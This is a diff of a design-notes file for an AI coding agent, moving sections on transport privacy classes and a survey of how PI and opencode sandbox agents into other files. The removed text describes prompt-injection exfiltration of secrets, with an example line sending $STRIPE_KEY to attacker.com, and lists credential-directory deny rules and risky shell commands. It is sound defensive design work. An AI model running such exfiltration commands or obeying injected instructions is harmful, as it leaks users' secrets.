@@ -82,8 +82,9 @@ Designed, not built. Shorter adjacent ideas still on the table:
   Designed, not built.
 - **Egress allowlist** for `fetch` / `bash` when in interactive
   mode (auto-deny non-allowlisted hosts, prompt for first-use
-  additions). Gondolin's egress-proxy pattern (see "Prior art"
-  below) is the heavyweight structural version.
+  additions). Gondolin's egress-proxy pattern (see
+  [`COMPARISON.md`](COMPARISON.md) §"Prior art deep-dive") is the
+  heavyweight structural version.
 - Prompt injection inside skill descriptions? Skills are
   user-installed text; current stance ([`SECURITY.md`](SECURITY.md)
   §"Code trust" — skills bullet) is "user-vetted by definition."
@@ -117,76 +118,13 @@ most egress firewalls don't filter port 53.
 
 ### Typed transport classes (private vs public)
 
-v0 thought: a loud startup banner at the privacy boundary
-documented in [`SECURITY.md`](SECURITY.md) §"Code trust" — LLM
-provider bullet ("Outbound LLM provider: api.openai.com — your
-prompts and tool results will be sent there"). Fine sketch,
-structurally weak — the user can click through a banner, and
-per-action banners ("indexer about to send 3 MB to
-api.openai.com") are inconsistent with the chat path that has
-been silently sending prompts to the same provider all along.
-The leak is set at chat-config time, not at fire time.
-
-Stronger shape, surfaced while scoping pikuri-vectordb (which
-adds two more LLM-shaped transports — embedder and reranker —
-on top of ruby_llm's chat transport): classify the transport
-instance itself as `:private` or `:public`, derived from its
-endpoint host, and let `Pikuri::Agent.new` refuse to mix classes
-by default.
-
-Rough shape:
-
-    module Pikuri::Transport
-      class Local
-        def privacy_class; :private; end
-      end
-      class OpenAI
-        def initialize(api_key:, base_url: 'https://api.openai.com')
-          @base_url = base_url
-        end
-        def privacy_class
-          URI(@base_url).host =~ /\A(localhost|127\.|\[?::1)/ \
-            ? :private : :public
-        end
-      end
-      # Embedder::*, Reranker::*, etc. each declare their own.
-    end
-
-    Pikuri::Agent.new(transport: chat, privacy: :strict)
-    # extensions / sub-agents whose transports differ in class are
-    # rejected at construction. :mixed opts out and logs every
-    # transport class loudly at boot.
-
-Three load-bearing points:
-
-- **Classification belongs to the transport instance**, derived
-  from the URL host. Loopback / `::1` / Unix socket → `:private`;
-  everything else → `:public`. LAN IPs, Tailscale endpoints, a
-  Caddy reverse-proxy on `localhost:8080` pointed at OpenAI —
-  pikuri can't verify network topology and won't try. Documented
-  limitation, not a defect.
-- **Fail-fast at construction, not per-request.** Strict mode
-  refuses cross-class wiring; `:mixed` is the explicit opt-in for
-  "private chat + public embedder" with loud boot logging.
-  Default is `:strict` in `bin/pikuri-assistant`; no-op in
-  `bin/pikuri-chat` where there's only the one transport today.
-- **The concept ends up broader than ruby_llm.** Embedders ride
-  `RubyLLM.embed`; rerankers don't exist in ruby_llm at all, so
-  `Pikuri::Transport::Reranker::*` is pikuri-core's own
-  first-class type, not a ruby_llm adapter. Argument for putting
-  classification *above* ruby_llm in the abstraction stack
-  rather than bolting it onto ruby_llm's config.
-
-`:private` and `:public` are also docs anchors — named concepts
-in the guide so the cliff is teachable, not something the user
-discovers from a banner one day.
-
-Sequencing: pikuri-vectordb v1 ships with plain URL arguments
-(`embedder:` / `reranker:` accept strings or transport objects
-interchangeably), and typed transports land in a follow-up
-session that touches pikuri-core and pikuri-vectordb together.
-Vectordb's transport configuration is constructor-only, so
-retrofitting is local.
+Classify each LLM-shaped transport instance (chat / embedder /
+reranker) as `:private` or `:public` from its endpoint host, and let
+`Pikuri::Agent.new` refuse to mix classes by default — the structural
+replacement for today's click-through provider banner. Long-form
+design note with the code sketch, the three load-bearing points, and
+the sequencing plan: [`ideas/typed-transports.md`](ideas/typed-transports.md).
+Designed, not built.
 
 ### MCP — open ergonomic / supply-chain questions
 
@@ -270,124 +208,16 @@ tempfile path returned to the LLM).
 
 ### Prior art: how PI and opencode handle this
 
-Surveyed both after writing the above. Findings reinforce the framing
-more than they contradict it.
-
-**Common ground.**
-- **Neither has prompt-injection defenses.** No provenance markers on
-  tool output, no "treat results as data" language in system prompts,
-  no separate channels. Confirms the load-bearing tag — nobody in this
-  space has solved it.
-- **Both cap tool output** at ~2000 lines / 50KB with overflow
-  spilled to a tempfile and the path returned to the LLM. Cheap to add
-  to pikuri.
-- **Both validate sub-agent privilege separation as the right shape** —
-  PI via a `--tools` allowlist on the spawned child
-  (`packages/coding-agent/examples/extensions/subagent/index.ts:267`),
-  opencode via inherited parent-denies plus per-preset deny baselines
-  (`packages/opencode/src/agent/subagent-permissions.ts`,
-  `agent/agent.ts:178-220`).
-
-**PI ships nothing security-related in core**, but offers isolation
-through two opt-in extensions of very different weights. No
-permission system in core (only a 30-line example extension
-regex-matching `rm -rf` / `sudo` / `chmod 777`), no workspace
-constraint (paths resolve absolutely with `~` expansion, no `..`
-rejection — `core/tools/path-utils.ts:54-93`), bash unrestricted, no
-MCP, no provider warnings, no Dockerfile. The README's stance is one
-line: "Run in a container yourself."
-
-The **lighter isolation extension** is `sandbox`: wraps the `bash`
-tool only — **bubblewrap on Linux / `sandbox-exec` on macOS** —
-driven by `~/.pi/agent/extensions/sandbox.json`. Default policy:
-network *on* with an npm / pypi / github allowlist; deny-read for
-`~/.ssh` / `~/.aws` / `~/.gnupg`; deny-write for `.env*` / `*.pem` /
-`*.key`. Only `bash` is wrapped — `edit` / `write` / `read` execute
-outside the sandbox, so a prompt-injection that prefers `edit` over
-`bash sed` walks past it. Sub-agents spawn as separate `pi` child
-processes that don't inherit the `-e ./sandbox` flag — no recursion.
-(`packages/coding-agent/examples/extensions/sandbox/index.ts`.)
-
-The **heavier isolation story is Gondolin**
-(<github.com/earendil-works/gondolin>, separate Apache-2.0 project
-from the same org) and the more interesting one as prior art.
-**Lightweight Linux micro-VMs** (QEMU by default, experimental
-`krun` backend) — explicitly stronger isolation than containers /
-namespaces. The PI-side extension *"runs pi tools inside a micro-VM
-and mounts your project at `/workspace`"*; the whole toolset runs
-inside, not just bash. Three design choices worth recording:
-
-- **Programmable HTTP/TLS egress proxy with allowlists.** Not just
-  iptables — a real proxy that inspects what's leaving.
-- **JS-configurable VFS mounts.** Host decides what filesystem the
-  guest sees.
-- **Secret-placeholder pattern.** Guest env vars hold placeholders,
-  not real values; the egress proxy substitutes the real secret
-  **only on outbound requests to allowlisted hosts**. A
-  prompt-injection that does `echo $STRIPE_KEY > attacker.com` fails
-  twice: env doesn't contain the real key, and `attacker.com` isn't
-  allowlisted. Genuinely novel prior art — Anthropic's MCP / OAuth
-  flows don't have an equivalent.
-
-Gondolin is also the substrate for **`pi-chat`** (Discord / Telegram
-→ Claude bridge, same org) — one micro-VM per channel for
-multi-tenant isolation. Worth noting: pi-chat's docs explicitly say
-*"All outbound HTTP/TLS open by default"* — the egress policy is
-available but not aggressively configured in that product.
-
-**opencode is the opposite.** A sophisticated three-action
-`allow` / `deny` / `ask` permission system keyed on
-`(permission-name, glob-pattern)`, last-match-wins, default-`ask`,
-persisted to per-project SQLite for `always` approvals
-(`packages/opencode/src/permission/evaluate.ts:11`,
-`permission/index.ts:140-145`), with a **tree-sitter bash parser**
-deriving sticky-approval prefix patterns like `git status *`
-(`tool/shell.ts:261-265, 308-333`). But `SECURITY.md` is explicit at
-the top: *"OpenCode does not sandbox the agent. The permission system
-exists as a UX feature... it is not designed to provide security
-isolation."* Workspace is soft — out-of-tree triggers an
-`external_directory` prompt, not a denial; no realpath / symlink
-resolution (`project/instance-context.ts:18-23`). MCP servers spawn
-as raw subprocesses inheriting `process.env`; schemas loaded
-eagerly (`mcp/index.ts:412-445, 513-549`). Sub-agent presets
-`general` / `explore` / `scout` use `"*": "deny"` with selective
-allows; parent denies propagate into the child. Skills load from
-arbitrary URLs with no signature / integrity check
-(`skill/discovery.ts:54-104`). No egress controls, no provider
-warnings.
-
-**Worth borrowing (or considering) for pikuri.**
-- **Disk spillover for over-cap output** (both). Per-tool byte caps
-  already exist in `Bash` / `Read` / `WebScrape`; the missing piece
-  is writing the overflow to a tempfile and returning the path so the
-  LLM can `grep` it.
-- **Sub-agent toolset narrowing** — *shipped* via personas; see
-  §"Personas for `Tool::SubAgent`."
-- **opencode's `(permission-name, glob-pattern)` ruleset shape** if
-  `Confirmer` ever expands beyond binary approve/deny.
-- **PI's credential-dir deny-read defaults** (`~/.ssh`, `~/.aws`,
-  `~/.gnupg`) — a `Workspace::Filesystem` default denylist gives some real
-  protection even without a sandbox, and it's a one-method change.
-  Same for deny-write on `.env*` / `*.pem` / `*.key`.
-- **Gondolin's secret-placeholder pattern.** A tool surface where env
-  vars are placeholders and real values flow only through a curated
-  egress proxy is a structural defense against exfil-via-prompt-
-  injection — not "approval prompt the user is no longer reading."
-  Heavyweight to implement (needs an HTTP/TLS interceptor); flagged
-  as future-thought.
-- **opencode's explicit "this is UX, not security" framing** in
-  their `SECURITY.md` is the honest baseline pikuri's
-  [`SECURITY.md`](SECURITY.md) borrows directly under "Non-goals".
-
-**Mental model worth recording:** PI itself ships no isolation in
-core. It offers *two extensions of different weights* — the
-bubblewrap `sandbox` (bash-only, lighter) and a Gondolin micro-VM
-integration (full Linux VM, full toolset). The user-facing "run pi
-in a sandbox" story is real, but user-configured and opt-in, not
-default. PI is thus prior art for **"ship the sandbox primitive
-separately, let the user opt in at the weight they need"** —
-different shape from opencode's explicit "we're not a sandbox, run
-it in Docker yourself."
+The deep survey of PI's two isolation weights (the bubblewrap-only
+`sandbox` extension and the heavier Gondolin micro-VM, with its
+egress-proxy + secret-placeholder pattern) and opencode's
+tree-sitter-backed `(permission, glob)` permission system — plus the
+"worth borrowing" shortlist — now lives in
+[`COMPARISON.md`](COMPARISON.md) §"Prior art deep-dive", alongside the
+higher-level permission/sandboxing comparison it extends. Findings
+reinforce pikuri's framing rather than contradict it: neither project
+ships prompt-injection defenses, both cap tool output to a tempfile,
+both validate sub-agent privilege separation as the right shape.
 
 ## Personas for `Tool::SubAgent`
 
